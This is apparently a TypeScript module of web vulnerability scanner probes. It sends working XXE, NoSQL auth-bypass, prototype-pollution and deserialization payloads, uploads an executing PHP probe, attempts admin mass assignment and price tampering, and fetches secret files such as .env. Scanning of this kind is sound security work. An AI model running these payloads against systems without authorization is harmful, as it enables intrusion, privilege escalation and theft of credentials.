import semver from "semver";
import { AuthSession, CONFIDENCE, FETCH_HEADERS, JsApiEndpoint, PendingFinding } from "../types";
import { isSpaHtmlFallback } from "../crawler";
import { authedFetch, safeFetch } from "../session";

function isSoft404OrSPARedirect(body: string, homepageHtml: string, path = ""): boolean {
  if (!body) return true;
  const trimmed = body.trim().toLowerCase();
  if (trimmed.startsWith("<!doctype html") || trimmed.startsWith("<html")) {
    if (homepageHtml) {
      const lenDiff = Math.abs(body.length - homepageHtml.length);
      const avgLen = (body.length + homepageHtml.length) / 2 || 1;
      if (lenDiff / avgLen < 0.1) return true;
    }
  }
  return false;
}

export async function probeXXE(targetUrl: string): Promise<PendingFinding | null> {
  const XXE_PAYLOAD = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`;

  const XML_ENDPOINTS = [
    "/api/", "/api/v1/", "/graphql", "/upload", "/import",
    "/parse", "/convert", "/data", "/feed", "/webhook",
  ];

  for (const path of XML_ENDPOINTS) {
    try {
      const url = new URL(path, targetUrl).toString();
      const resp = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/xml",
          "User-Agent": FETCH_HEADERS["User-Agent"],
          Accept: "application/xml,text/xml,*/*",
        },
        body: XXE_PAYLOAD,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (!resp) continue;
      const body = await resp.text();
      if (/root:x:0:0|bin\/bash|daemon:x|nobody:x/i.test(body)) {
        return {
          type: "xxe-injection",
          severity: "CRITICAL",
          url,
          evidence: `XML External Entity (XXE) Injection confirmed at ${url}. The server processed the external entity declaration and returned contents of /etc/passwd.`,
          cvssScore: 9.1,
          cveId: "CWE-611",
        };
      }
    } catch { /* next endpoint */ }
  }
  return null;
}

export async function probePrototypePollution(paramUrl: string): Promise<PendingFinding | null> {
  const PROTO_PAYLOADS = [
    { param: "__proto__[vulnscan]", value: "vulnscan_polluted" },
    { param: "constructor[prototype][vulnscan]", value: "vulnscan_polluted" },
    { param: "__proto__.vulnscan", value: "vulnscan_polluted" },
  ];
  try {
    const u = new URL(paramUrl);
    for (const { param, value } of PROTO_PAYLOADS) {
      try {
        const testUrl = new URL(u.toString());
        testUrl.searchParams.set(param, value);
        const resp = await safeFetch(testUrl.toString(), 5000);
        if (!resp || resp.status !== 200) continue;
        const body = await resp.text();

        try {
          const json = JSON.parse(body);
          if (json && typeof json === "object" && json.vulnscan === value) {
            const cleanResp = await safeFetch(u.toString(), 5000);
            const cleanText = cleanResp ? await cleanResp.text().catch(() => "") : "";
            let isPersistent = false;
            try {
              const cleanJson = JSON.parse(cleanText);
              if (cleanJson && cleanJson.vulnscan === value) isPersistent = true;
            } catch { /* ignore */ }

            return {
              type: "prototype-pollution",
              severity: "HIGH",
              url: testUrl.toString(),
              parameter: param,
              evidence: `Prototype Pollution confirmed${isPersistent ? " (cross-request persistent)" : ""}. Injected parameter "${param}=${value}" polluted the Object prototype graph.`,
              cvssScore: 8.0,
              cveId: "CWE-1321",
              isVerified: isPersistent,
              confidence: isPersistent ? CONFIDENCE.DUAL_VERIFIED : CONFIDENCE.SINGLE_PAYLOAD,
            };
          }
        } catch { /* not json */ }
      } catch { /* next */ }
    }
  } catch { /* skip */ }
  return null;
}

export async function probeNoSQLi(targetUrl: string): Promise<PendingFinding | null> {
  const NOSQL_PAYLOADS = [{ "$gt": "" }, { "$ne": "nonexistent" }];
  const authPaths = [
    "/rest/user/login", "/api/login", "/api/auth/login",
    "/api/v1/auth/login", "/auth/login", "/login",
  ];

  for (const path of authPaths) {
    try {
      const url = new URL(path, targetUrl).toString();
      const baseline = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
        body: JSON.stringify({ email: "nonexistent@nonexistent.com", password: "wrong" }),
        signal: AbortSignal.timeout(5000),
      }).catch(() => null);

      if (!baseline || baseline.status === 404) continue;

      for (const payload of NOSQL_PAYLOADS) {
        const body1 = { email: payload, password: payload };
        const body2 = { username: payload, password: payload };
        const body3 = { user: payload, pass: payload };

        for (const body of [body1, body2, body3]) {
          const resp = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "User-Agent": FETCH_HEADERS["User-Agent"],
              Accept: "application/json",
            },
            body: JSON.stringify(body),
            signal: AbortSignal.timeout(6000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);

          if (!resp) continue;
          const text = await resp.text();

          if (resp.status === 200) {
            let hasRealToken = false;
            try {
              const json = JSON.parse(text);
              const tokenVal = json?.token || json?.data?.token || json?.authentication?.token ||
                json?.access_token || json?.accessToken || json?.jwt || "";
              hasRealToken = typeof tokenVal === "string" && tokenVal.length >= 20;
            } catch {
              hasRealToken = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/i.test(text);
            }
            if (hasRealToken) {
              return {
                type: "nosql-injection",
                severity: "CRITICAL",
                url,
                evidence: `NoSQL Injection Auth Bypass confirmed at ${url}. Mongo operator payload returned HTTP 200 with session token.`,
                cvssScore: 9.8,
                cveId: "CWE-943",
                isVerified: true,
                confidence: CONFIDENCE.DUAL_VERIFIED,
              };
            }
          }
        }
      }
    } catch { /* next */ }
  }
  return null;
}

export async function probeExposedBackupFiles(targetUrl: string, homepageHtml?: string): Promise<PendingFinding | null> {
  const sensitiveFiles = [
    { path: "/ftp/package.json.bak", type: "JSON Developer Backup", pattern: /"dependencies"\s*:|"devDependencies"\s*:/ },
    { path: "/ftp/coupons_2013.md.bak", type: "Sales MD Backup", pattern: /coupon_code|discount_rate|COUPON2013/i },
    { path: "/ftp/eastere.gg", type: "Exposed Easter Egg File", pattern: /easter_egg_secret|easteregg_token/i },
    { path: "/encryptionkeys", type: "Exposed Encryption Keys Directory", pattern: /-----BEGIN (RSA|EC|OPENSSH|PRIVATE) KEY-----|PRIVATE_KEY_PEM/i },
    { path: "/ftp/", type: "FTP Directory Listing", pattern: /Index of \/ftp|Parent Directory/i },
    { path: "/.env", type: "Environment File", pattern: /(DB_PASSWORD|JWT_SECRET|AWS_SECRET_ACCESS_KEY)=/i },
    { path: "/.git/config", type: "Git Config", pattern: /\[core\][\s\S]*repositoryformatversion/i },
    { path: "/package.json.bak", type: "Package JSON Backup", pattern: /"dependencies"\s*:|"devDependencies"\s*:/ },
    { path: "/package-lock.json", type: "Package Lock File", pattern: /"lockfileVersion"\s*:|"packages"\s*:/ },
    { path: "/database.sqlite", type: "SQLite Database", pattern: /^SQLite format 3/ },
    { path: "/db.sqlite", type: "SQLite Database", pattern: /^SQLite format 3/ },
    { path: "/backup.zip", type: "ZIP Archive", pattern: /^PK\x03\x04/ },
    { path: "/wp-config.php.bak", type: "WordPress Config Backup", pattern: /define\(\s*['"]DB_PASSWORD['"]/i },
    { path: "/config.json", type: "Config JSON File", pattern: /"(database|db_password|jwt_secret|api_key)"\s*:/i },
  ];

  for (const file of sensitiveFiles) {
    try {
      const url = new URL(file.path, targetUrl).toString();
      const resp = await fetch(url, {
        headers: FETCH_HEADERS,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (!resp || resp.status !== 200) continue;

      const contentType = resp.headers.get("content-type") || "";
      const isExpectedHtml = file.path.endsWith(".html") || file.path.endsWith(".htm") || file.path.endsWith("/");
      if (!isExpectedHtml && contentType.includes("text/html")) continue;

      const text = await resp.text();
      if (!isExpectedHtml && (text.trim().toLowerCase().startsWith("<!doctype html") || text.trim().toLowerCase().startsWith("<html"))) {
        continue;
      }

      if (homepageHtml && isSoft404OrSPARedirect(text, homepageHtml, file.path)) continue;

      if (file.pattern.test(text)) {
        return {
          type: "exposed-sensitive-file",
          severity: "HIGH",
          url,
          evidence: `Sensitive Data Exposure via Exposed Backup File: "${file.type}" found at ${url}.`,
          cvssScore: 7.5,
          cveId: "CWE-538",
          isVerified: true,
          confidence: CONFIDENCE.DETERMINISTIC,
        };
      }
    } catch { /* skip */ }
  }
  return null;
}

export async function probeDirectoryListing(targetUrl: string, homepageHtml?: string): Promise<PendingFinding | null> {
  const DIRS = ["/uploads/", "/files/", "/backup/", "/static/", "/assets/", "/images/", "/logs/", "/tmp/", "/temp/", "/data/"];
  const INDEX_MARKERS = [/Index of \//i, /<title>Directory listing/i, /\[DIR\]/i, /Parent Directory/i, /Last modified.*Size/i];
  for (const dir of DIRS) {
    try {
      const url = new URL(dir, targetUrl).toString();
      const resp = await safeFetch(url, 4000);
      if (!resp || resp.status !== 200) continue;
      const body = await resp.text();

      if (homepageHtml && isSoft404OrSPARedirect(body, homepageHtml)) continue;

      const hit = INDEX_MARKERS.find((p) => p.test(body));
      if (hit) {
        return {
          type: "directory-listing-exposed",
          severity: "MEDIUM",
          url,
          evidence: `Directory listing is enabled at ${url}. Web server is showing a browsable index.`,
          cvssScore: 5.3,
          cveId: "CWE-548",
        };
      }
    } catch { /* skip */ }
  }
  return null;
}

export async function probeHTTPSRedirect(targetUrl: string): Promise<PendingFinding | null> {
  if (targetUrl.startsWith("https://")) {
    try {
      const u = new URL(targetUrl);
      if (u.pathname !== "/" && u.pathname !== "") return null;

      const httpUrl = `${u.protocol.replace("https", "http")}//${u.host}/`;
      const resp = await fetch(httpUrl, {
        method: "HEAD",
        headers: FETCH_HEADERS,
        redirect: "manual",
        signal: AbortSignal.timeout(5000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (resp) {
        const isRedirect = resp.status >= 300 && resp.status < 400;
        const location = resp.headers.get("location") || "";
        if (!isRedirect || !location.startsWith("https://")) {
          return {
            type: "missing-https-redirect",
            severity: "MEDIUM",
            url: httpUrl,
            evidence: `HTTP version at ${httpUrl} does not automatically redirect to HTTPS (responded with ${resp.status}).`,
            cvssScore: 6.5,
            cveId: "CWE-319",
          };
        }
      }
    } catch { /* skip */ }
  }
  return null;
}

export async function probeHTMLInjection(paramUrl: string): Promise<PendingFinding | null> {
  const PAYLOADS = [`<h1>VulnScanProbe</h1>`, `<b>VulnScanProbe</b>`, `<a href="https://evil.com">VulnScanProbe</a>`];
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    for (const param of params) {
      for (const payload of PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, payload);
          const resp = await safeFetch(testUrl.toString(), 5000);
          if (!resp) continue;
          const body = await resp.text();
          const bodyMatch = body.match(/<body[^>]*>([\s\S]*)<\/body>/i);
          const contentToCheck = bodyMatch ? bodyMatch[1] : body;

          if (
            contentToCheck.includes(payload) &&
            !contentToCheck.includes(payload.replace(/</g, "&lt;")) &&
            !contentToCheck.includes("&#60;") &&
            !contentToCheck.includes("\\u003c")
          ) {
            return {
              type: "html-injection",
              severity: "MEDIUM",
              url: testUrl.toString(),
              parameter: param,
              evidence: `HTML Injection detected. Payload "${payload.substring(0, 50)}" in parameter "${param}" is reflected as raw HTML.`,
              cvssScore: 5.4,
              cveId: "CWE-79",
            };
          }
        } catch { /* next */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

export async function probeInsecureDeserialization(paramUrl: string): Promise<PendingFinding | null> {
  const DESER_PAYLOADS = [
    { payload: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}"}', db: "Node.js node-serialize" },
    { payload: "B\x00\x00\x00\x00\x00c__main__\nRCE\nq\x00)Rq\x01.", db: "Python Pickle" },
    { payload: '{"__proto__":{"isAdmin":true}}', db: "Prototype-based deserialization" },
  ];

  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    for (const param of params.slice(0, 3)) {
      for (const { payload } of DESER_PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, payload);
          const resp = await safeFetch(testUrl.toString(), 6000);
          if (!resp) continue;
          const body = await resp.text();

          if (/uid=\d+\(|root:x:0:0|unpickling error|Pickle protocol|node-serialize|PHP Object|__PHP_Incomplete_Class/i.test(body)) {
            return {
              type: "insecure-deserialization",
              severity: "CRITICAL",
              url: testUrl.toString(),
              parameter: param,
              evidence: `Insecure Deserialization vulnerability confirmed via parameter "${param}". Payload triggered RCE output or deserialization error messages.`,
              cvssScore: 9.8,
              cveId: "CWE-502",
            };
          }
        } catch { /* next payload */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

export async function probeSoftwareCompositionAnalysis(baseUrl: string): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];
  const COMMON_VULN_PACKAGES: Record<string, { minVersion?: string; affectedVersions: string[] }> = {
    lodash: { affectedVersions: ["<4.17.11"] },
    jquery: { affectedVersions: ["<3.4.0"] },
    express: { affectedVersions: ["<4.18.0"] },
    mongoose: { affectedVersions: ["<5.10.0"] },
    "node-serialize": { affectedVersions: ["<0.0.4"] },
    pyyaml: { affectedVersions: ["<5.3.1"] },
    django: { affectedVersions: ["<2.2.8"] },
    flask: { affectedVersions: ["<1.1.0"] },
  };

  const packagePaths = ["/package.json", "/package-lock.json"];

  for (const path of packagePaths) {
    try {
      const url = new URL(path, baseUrl).toString();
      const resp = await safeFetch(url, 5000);
      if (!resp || resp.status !== 200) continue;
      const content = await resp.text();
      if (!content || content.length < 50) continue;

      if (path === "/package.json") {
        try {
          const pkg = JSON.parse(content);
          const allDeps = { ...pkg.dependencies, ...pkg.devDependencies };

          for (const [name, versionStr] of Object.entries(allDeps)) {
            const cleanVersion = String(versionStr).replace(/^[~^>=<]/, "");
            if (COMMON_VULN_PACKAGES[name] && cleanVersion) {
              const vuln = COMMON_VULN_PACKAGES[name];
              const isVulnerable = vuln.affectedVersions.some((constraint) => {
                try {
                  const threshold = constraint.replace(/^[<>]=?/, "");
                  const op = constraint.startsWith("<=")
                    ? "lte"
                    : constraint.startsWith("<")
                    ? "lt"
                    : constraint.startsWith(">=")
                    ? "gte"
                    : "gt";
                  const coerced = semver.coerce(cleanVersion);
                  if (!coerced) return false;
                  return semver[op](coerced, threshold);
                } catch {
                  return false;
                }
              });
              if (isVulnerable) {
                findings.push({
                  type: "vulnerable-dependency",
                  severity: "HIGH",
                  url,
                  parameter: `${name}@${versionStr}`,
                  evidence: `Vulnerable dependency detected in package.json: "${name}@${versionStr}" is known to contain security vulnerabilities.`,
                  cvssScore: 7.5,
                  cveId: "CWE-1104",
                });
              }
            }
          }
        } catch { /* json parse error */ }
      }

      if (path === "/package-lock.json") {
        try {
          const parsed = JSON.parse(content);
          if (parsed && (parsed.lockfileVersion || parsed.dependencies || parsed.packages)) {
            findings.push({
              type: "sensitive-file-exposed",
              severity: "MEDIUM",
              url,
              evidence: `package-lock.json is publicly accessible. This file contains the full dependency tree with exact versions.`,
              cvssScore: 5.3,
              cveId: "CWE-1104",
            });
          }
        } catch { /* json parse error */ }
      }
    } catch { /* skip */ }
  }

  return findings;
}

export async function probeFileUploadVulnerabilities(baseUrl: string, html: string): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];
  const uploadForms: Array<{ action: string; fieldName: string }> = [];

  for (const formMatch of html.matchAll(/<form[^>]*>([\s\S]*?)<\/form>/gi)) {
    const formBody = formMatch[1] || "";
    const fullForm = formMatch[0];

    const fileInputMatch = formBody.match(/<input[^>]+type=["']?file["']?[^>]*name=["']([^"']+)["']/i);
    if (fileInputMatch) {
      const actionMatch = fullForm.match(/action=["']([^"']+)["']/i);
      const actionUrl = actionMatch ? new URL(actionMatch[1], baseUrl).toString() : baseUrl;
      uploadForms.push({ action: actionUrl, fieldName: fileInputMatch[1] });
    }
  }

  const uploadApiPaths = [
    "/api/upload", "/api/v1/upload", "/api/v2/upload", "/api/uploads", "/upload",
    "/api/file/upload", "/api/files/upload", "/rest/file/upload", "/file/upload",
    "/files/upload", "/upload/file", "/api/images/upload", "/api/media/upload",
  ];

  for (const path of uploadApiPaths) {
    try {
      const url = new URL(path, baseUrl).toString();
      const resp = await safeFetch(url, 5000);
      if (resp && (resp.status === 200 || resp.status === 405)) {
        const text = await resp.text().catch(() => "");
        if (!isSpaHtmlFallback(resp, text)) {
          uploadForms.push({ action: url, fieldName: "file" });
        }
      }
    } catch { /* skip */ }
  }

  if (uploadForms.length === 0) return findings;

  for (const { action, fieldName } of uploadForms.slice(0, 3)) {
    try {
      const webshellContent = "<?php echo 'VULNSCAN_RCE_' . php_uname(); ?>";
      const webshellFormData = new FormData();
      webshellFormData.append(fieldName, new Blob([webshellContent], { type: "application/x-php" }), "vulnscan_probe.php");

      const webshellResp = await fetch(action, {
        method: "POST",
        body: webshellFormData,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (!webshellResp || !webshellResp.ok) continue;
      const uploadText = await webshellResp.text().catch(() => "");
      if (isSpaHtmlFallback(webshellResp, uploadText)) continue;

      // Step 2: Try to discover the uploaded file URL from the response
      // Common upload APIs return { url, path, filename, location, file } in JSON
      let uploadedFileUrl: string | null = null;
      try {
        const json = JSON.parse(uploadText);
        const rawPath =
          json?.url || json?.path || json?.filename || json?.location ||
          json?.file || json?.data?.url || json?.data?.path ||
          json?.result?.url || json?.result?.path || null;
        if (rawPath && typeof rawPath === "string") {
          uploadedFileUrl = rawPath.startsWith("http")
            ? rawPath
            : new URL(rawPath, action).toString();
        }
      } catch {
        // Fall back: scan body for a relative or absolute URL ending in .php
        const urlMatch = uploadText.match(/["']((?:\/[^"']*)?vulnscan_probe\.php)["']/i);
        if (urlMatch) {
          uploadedFileUrl = new URL(urlMatch[1], action).toString();
        }
      }

      if (uploadedFileUrl) {
        // Step 3: Fetch the uploaded file — if PHP executed our probe, it outputs the OS info
        const execResp = await safeFetch(uploadedFileUrl, 6000);
        if (execResp && execResp.status === 200) {
          const execBody = await execResp.text().catch(() => "");
          const phpExecuted = /VULNSCAN_RCE_|Linux|Darwin|Windows NT/i.test(execBody) &&
            !/<html|<!doctype/i.test(execBody.slice(0, 200));

          if (phpExecuted) {
            // Confirmed RCE via PHP execution — CRITICAL
            findings.push({
              type: "file-upload-executable",
              severity: "CRITICAL",
              url: uploadedFileUrl,
              parameter: fieldName,
              evidence: `Unrestricted File Upload with confirmed Remote Code Execution: uploaded PHP probe to ${action}, fetched at ${uploadedFileUrl}, and PHP executed (output: "${execBody.slice(0, 100)}").`,
              cvssScore: 9.8,
              cveId: "CWE-434",
              confidence: 0.99,
              isVerified: true,
              validationSteps: [
                `Uploaded PHP file to ${action} — accepted (HTTP ${webshellResp.status})`,
                `Fetched uploaded file at ${uploadedFileUrl} — PHP execution confirmed (OS info returned)`,
              ],
            });
          } else {
            // File is accessible but PHP not executed (likely stored as static asset) — MEDIUM
            findings.push({
              type: "file-upload-stored-accessible",
              severity: "MEDIUM",
              url: uploadedFileUrl,
              parameter: fieldName,
              evidence: `File Upload: endpoint ${action} accepted a PHP file and it is publicly accessible at ${uploadedFileUrl}, however PHP does not appear to have executed. The file may be served as static content — potential for stored XSS or path traversal depending on content.`,
              cvssScore: 6.5,
              cveId: "CWE-434",
              confidence: 0.80,
              isVerified: false,
              validationSteps: [
                `Uploaded PHP file to ${action} — accepted (HTTP ${webshellResp.status})`,
                `Fetched uploaded file at ${uploadedFileUrl} — file accessible but PHP not executed`,
              ],
            });
          }
        }
      } else {
        // Step 3 fallback: can't determine file path → low-confidence signal only (not CRITICAL)
        findings.push({
          type: "file-upload-accepted",
          severity: "LOW",
          url: action,
          parameter: fieldName,
          evidence: `File Upload: endpoint ${action} accepted a PHP file upload (HTTP ${webshellResp.status}) but the uploaded file URL could not be determined. Manual verification required to confirm if the file is stored or executable.`,
          cvssScore: 3.1,
          cveId: "CWE-434",
          confidence: 0.50,
          isVerified: false,
          validationSteps: [
            `Uploaded PHP file to ${action} — server returned HTTP ${webshellResp.status}`,
            "Uploaded file URL not determinable from response — manual verification needed",
          ],
        });
      }
    } catch { /* next */ }
  }

  return findings;
}

export async function probeMassAssignment(
  baseUrl: string,
  jsBundleEndpoints: JsApiEndpoint[],
  session: AuthSession
): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];
  const PRIVILEGE_ESCALATION_PAYLOADS = [
    { role: "admin" },
    { isAdmin: true },
    { admin: true },
    { role: "administrator" },
    { permissions: ["admin", "superuser"] },
    { userType: "admin" },
  ];

  const sensitiveEndpoints = [
    "/api/users", "/api/v1/users", "/api/v2/users", "/api/register", "/api/signup",
    "/rest/user/register", "/api/user/register", "/api/account", "/api/auth/register",
  ];

  for (const path of sensitiveEndpoints) {
    try {
      const url = new URL(path, baseUrl).toString();
      const testEmail = `test_${Date.now()}@vulnscan.internal`;
      const normalBody = { email: testEmail, password: "TestPassword123!", username: "testuser" };

      const normalResp = await authedFetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(normalBody),
      }, 6000, false, session);

      if (!normalResp || normalResp.status === 404) continue;

      for (const payload of PRIVILEGE_ESCALATION_PAYLOADS) {
        const escalatedBody = { ...normalBody, ...payload };
        const escalatedResp = await authedFetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(escalatedBody),
        }, 6000, false, session);

        if (escalatedResp && (escalatedResp.status === 200 || escalatedResp.status === 201)) {
          const text = await escalatedResp.text().catch(() => "");
          try {
            const json = JSON.parse(text);
            const key = Object.keys(payload)[0];
            const val = payload[key as keyof typeof payload];

            const isEscalated =
              json[key] === val ||
              (key === "role" && (json.role === "admin" || json.role === "administrator")) ||
              (key === "isAdmin" && json.isAdmin === true) ||
              (key === "admin" && json.admin === true);

            if (isEscalated) {
              findings.push({
                type: "mass-assignment-privilege-escalation",
                severity: "CRITICAL",
                url,
                parameter: key,
                evidence: `Mass Assignment vulnerability confirmed. Injecting parameter "${key}: ${val}" modified account role.`,
                cvssScore: 9.8,
                cveId: "CWE-915",
                isVerified: true,
                confidence: CONFIDENCE.EXEC_VERIFIED,
              });
              break;
            }
          } catch { /* not json */ }
        }
      }
    } catch { /* next */ }
  }
  return findings;
}

export async function probeBusinessLogicVulnerabilities(
  baseUrl: string,
  session: AuthSession
): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];

  const isSuccessfulJsonResponse = async (resp: Response | null): Promise<any | null> => {
    if (!resp || (resp.status !== 200 && resp.status !== 201)) return null;
    const contentType = (resp.headers.get("content-type") || "").toLowerCase();
    const text = await resp.text().catch(() => "");
    if (isSpaHtmlFallback(resp, text)) return null;
    if (!contentType.includes("application/json") && !text.trim().startsWith("{") && !text.trim().startsWith("[")) {
      return null;
    }
    try {
      const json = JSON.parse(text);
      if (!json || typeof json !== "object") return null;
      if (json.status === "error" || json.success === false || json.error) return null;
      const msg = String(json.message || json.detail || json.error || "").toLowerCase();
      if (msg.includes("invalid") || msg.includes("not found") || msg.includes("failed") || msg.includes("denied")) return null;
      return json;
    } catch {
      return null;
    }
  };

  const priceEndpoints = ["/api/basket", "/api/cart", "/api/orders", "/rest/basket", "/api/v1/basket"];
  for (const path of priceEndpoints) {
    try {
      const url = new URL(path, baseUrl).toString();
      const negativePriceBody = { productId: 1, quantity: 1, price: -100, total: -100 };

      const resp = await authedFetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(negativePriceBody),
      }, 6000, false, session);

      const json = await isSuccessfulJsonResponse(resp);
      if (json && (json.price === -100 || json.total === -100 || json.status === "success" || json.id)) {
        findings.push({
          type: "business-logic-price-manipulation",
          severity: "CRITICAL",
          url,
          parameter: "price",
          evidence: `Business Logic vulnerability: Negative price manipulation confirmed. The endpoint accepted price (-100).`,
          cvssScore: 9.1,
          cveId: "CWE-840",
          isVerified: true,
          confidence: CONFIDENCE.EXEC_VERIFIED,
        });
        break;
      }
    } catch { /* next */ }
  }

  return findings;
}
